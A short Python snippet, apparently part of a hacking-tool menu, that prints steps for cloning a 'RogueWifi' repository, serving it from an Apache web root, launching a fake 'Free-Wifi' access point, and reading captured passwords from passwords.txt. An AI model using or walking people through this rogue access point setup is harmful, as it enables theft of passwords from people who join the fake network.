import os
import sys
from termcolor import colored

def capPort():
	print(colored('download >>\ngit clone https://github.com/s0meguy1/RogueWifu.git', 'yellow'))
	print('\n \n')
	msg = '''

1. go to program, "cd RogueWifi"
2. copy all the files to the apache web server, "cp -r * /var/www/html"
3. go to apache web server, "cd /var/www/html/"
4. now you can run the script, "./wifi.sh wlan0 eth0 Free-Wifi"
5. you can review passwords in that directory, they are labeled as "passwords.txt"

	'''

	print(colored(msg, 'yellow'))
